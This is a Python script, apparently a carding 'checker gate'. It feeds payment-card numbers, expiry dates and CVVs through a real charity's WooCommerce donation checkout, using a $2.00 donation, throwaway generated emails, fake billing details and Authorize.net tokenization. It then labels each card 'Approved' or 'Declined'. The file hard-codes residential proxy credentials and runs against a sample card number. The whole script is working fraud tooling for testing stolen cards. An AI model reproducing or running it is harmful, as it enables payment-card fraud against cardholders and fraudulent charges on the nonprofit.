import random
import re
import uuid
from bs4 import BeautifulSoup
import names
import requests

class ConfigsPAge:
    def QueryText(self, data:str = None, chainOne:str = None, chainTwo:str = None):
        
            self.uophs = data[ data.index(chainOne) + len (chainOne):data.index(chainTwo,  data.index(chainOne) + len (chainOne))]
            try:
                return self.uophs
            
            except: 
                return 'value not found' 
    @classmethod
    def SessionId(self):
        self.id = str(uuid.uuid4())
        return self.id
    @classmethod
    def RandomName(self,dato:str=None):
        
        if dato == 'email': 
            self.email = "{}{}{}@gmail.com".format(
                names.get_first_name(),
                names.get_last_name(),
                random.randint(1000000,9999999)
            )
            return self.email
        
        else:
            return 'valores incorrectos: >>>   BehaviorsBraintree().RandomName("username")'
    
    
    
    def SaveResponseHhml(self, response:str):
        with open("ResponseHhml.html", "w", encoding="utf-8") as f:
            f.write(response)

proxy_url = 'http://77b7b08f59b2dcc1:RNW78Fm5@res.proxy-seller.com:10000'

class NewGAteauth:
    def main(self,card):
        try:
            self.ccs = card.split('|')
            self.UseMail = ConfigsPAge().RandomName('email')
            if self.ccs[0].startswith("4"): self.brand = "VISA"
            if self.ccs[0].startswith("3"): self.brand = "AMEX"
            if self.ccs[0].startswith("6"): self.brand = "DISCOVER"
            elif self.ccs[0].startswith("5"): self.brand = "MASTER_CARD"
            self.session = requests.Session()

            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-419,es;q=0.9','cache-control': 'max-age=0','priority': 'u=0, i','referer': 'https://store.faithalone.org/product-category/donate/','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',}
            response = self.session.get('https://store.faithalone.org/shop/donate/donate/', headers=headers)

            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-419,es;q=0.9','cache-control': 'max-age=0','content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryHS1yBjfODtKyXZs8','origin': 'https://store.faithalone.org','priority': 'u=0, i','referer': 'https://store.faithalone.org/shop/donate/donate/','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',}
            data = f'------WebKitFormBoundaryHS1yBjfODtKyXZs8\r\nContent-Disposition: form-data; name="nyp"\r\n\r\n2.00\r\n------WebKitFormBoundaryHS1yBjfODtKyXZs8\r\nContent-Disposition: form-data; name="update-price"\r\n\r\n\r\n------WebKitFormBoundaryHS1yBjfODtKyXZs8\r\nContent-Disposition: form-data; name="_nypnonce"\r\n\r\n\r\n------WebKitFormBoundaryHS1yBjfODtKyXZs8\r\nContent-Disposition: form-data; name="quantity"\r\n\r\n1\r\n------WebKitFormBoundaryHS1yBjfODtKyXZs8\r\nContent-Disposition: form-data; name="add-to-cart"\r\n\r\n7167\r\n------WebKitFormBoundaryHS1yBjfODtKyXZs8--\r\n'
            response = self.session.post('https://store.faithalone.org/shop/donate/donate/', headers=headers, data=data)

            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-419,es;q=0.9','cache-control': 'max-age=0','priority': 'u=0, i','referer': 'https://store.faithalone.org/shop/donate/donate/','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',}
            response = self.session.get('https://store.faithalone.org/cart/', headers=headers)

            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-419,es;q=0.9','priority': 'u=0, i','referer': 'https://store.faithalone.org/cart/','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',}
            r1 = self.session.get('https://store.faithalone.org/checkout/', headers=headers)
            Chekhout = ConfigsPAge().QueryText(r1.text,'name="woocommerce-process-checkout-nonce" value="', '"')
            nonce_client = ConfigsPAge().QueryText(r1.text, 'clientKey="','"')
            nonce_login_id = ConfigsPAge().QueryText(r1.text, '"login_id":"','"')
            id_session = ConfigsPAge().SessionId()

            headers = {'Accept': '*/*','Accept-Language': 'es-419,es;q=0.9','Access-Control-Request-Headers': 'content-type','Access-Control-Request-Method': 'POST','Connection': 'keep-alive','Origin': 'https://store.faithalone.org','Referer': 'https://store.faithalone.org/','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',}
            response = self.session.options('https://api2.authorize.net/xml/v1/request.api', headers=headers)

            headers = {'Accept': '*/*','Accept-Language': 'es-419,es;q=0.9','Connection': 'keep-alive','Content-Type': 'application/json; charset=UTF-8','Origin': 'https://store.faithalone.org','Referer': 'https://store.faithalone.org/','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',}
            json_data = {
                'securePaymentContainerRequest': {
                    'merchantAuthentication': {
                        'name': 'grace75',
                        'clientKey': nonce_client,
                    },
                    'data': {
                        'type': 'TOKEN',
                        'id': id_session,
                        'token': {
                            'cardNumber': self.ccs[0],
                            'expirationDate': f'{self.ccs[1]}{self.ccs[2]}',
                            'cardCode': self.ccs[3],
                            'zip': '10036',
                            'fullName': 'saddada fsafafasf',
                        },
                    },
                },
            }
            r2 = self.session.post('https://api2.authorize.net/xml/v1/request.api', headers=headers, json=json_data)
            dataValue = ConfigsPAge().QueryText(r2.text,'"dataValue":"','"')

            headers = {'accept': 'application/json, text/javascript, */*; q=0.01','accept-language': 'es-419,es;q=0.9','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','origin': 'https://store.faithalone.org','priority': 'u=1, i','referer': 'https://store.faithalone.org/checkout/','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36','x-requested-with': 'XMLHttpRequest',}
            params = {'wc-ajax': 'checkout',}
            data = f'username=&password=&woocommerce-login-nonce=59a560b594&_wp_http_referer=https%3A%2F%2Fstore.faithalone.org%2Fcheckout%2F%3FelementorPageId%3D124689%26elementorWidgetId%3D1519a6a9&redirect=https%3A%2F%2Fstore.faithalone.org%2Fcheckout%2F&wc_order_attribution_source_type=typein&wc_order_attribution_referrer=(none)&wc_order_attribution_utm_campaign=(none)&wc_order_attribution_utm_source=(direct)&wc_order_attribution_utm_medium=(none)&wc_order_attribution_utm_content=(none)&wc_order_attribution_utm_id=(none)&wc_order_attribution_utm_term=(none)&wc_order_attribution_utm_source_platform=(none)&wc_order_attribution_utm_creative_format=(none)&wc_order_attribution_utm_marketing_tactic=(none)&wc_order_attribution_session_entry=https%3A%2F%2Fstore.faithalone.org%2F&wc_order_attribution_session_start_time=2025-04-05+00%3A18%3A52&wc_order_attribution_session_pages=7&wc_order_attribution_session_count=1&wc_order_attribution_user_agent=Mozilla%2F5.0+(Windows+NT+10.0%3B+Win64%3B+x64)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F134.0.0.0+Safari%2F537.36&_mc4wp_subscribe_woocommerce=0&INTERESTS%5Bdbac82d1f6%5D%5B%5D=4208ccb337&billing_first_name=saddada&billing_last_name=fsafafasf&billing_company=&billing_country=US&billing_address_1=Times+Square%2C+Nueva+York%2C+EE.+UU.&billing_address_2=&billing_city=Manhattan&billing_state=NY&billing_postcode=10036&billing_phone=6466308864&billing_email={self.UseMail}&_mc4wp_subscribe_woocommerce=1&order_comments=&coupon_code=&payment_method=authorize_net_cim_credit_card&wc-authorize-net-cim-credit-card-context=shortcode&wc-authorize-net-cim-credit-card-expiry=03+%2F+28&wc-authorize-net-cim-credit-card-payment-nonce={dataValue}&wc-authorize-net-cim-credit-card-payment-descriptor=COMMON.ACCEPT.INAPP.PAYMENT&wc-authorize-net-cim-credit-card-last-four=9044&wc-authorize-net-cim-credit-card-card-type=visa&woocommerce-process-checkout-nonce={Chekhout}&_wp_http_referer=https%3A%2F%2Fstore.faithalone.org%2Fcheckout%2F%3FelementorPageId%3D124689%26elementorWidgetId%3D1519a6a9'
            Sexo = self.session.post('https://store.faithalone.org/', params=params, headers=headers, data=data)
            ConfigsPAge().SaveResponseHhml(Sexo.text)

            if 'succes' in Sexo.text:
                return 'Approved! ✅','Charged $2.00'

            elif 'The card verification number does not match. Please re-enter and try again.' in Sexo.text:
                return 'Approved! ✅', 'Card verification number does not match.'

            elif 'The provided address does not match the billing address for cardholder.' in Sexo.text:
                return 'Approved! ✅','Charged $2.00'

            else:

                mesasage = Sexo.json()['messages'] 
                ress = BeautifulSoup(mesasage, 'html.parser')
                error_message = ress.find('ul', class_='woocommerce-error').find('li').text.strip()
                return 'Declined! ❌',error_message
       
        except: return 'Declined! ❌','The provided card was declineda.'
                

if __name__ == '__main__':
    print(NewGAteauth().main('4426441313931192|10|2028|818')) 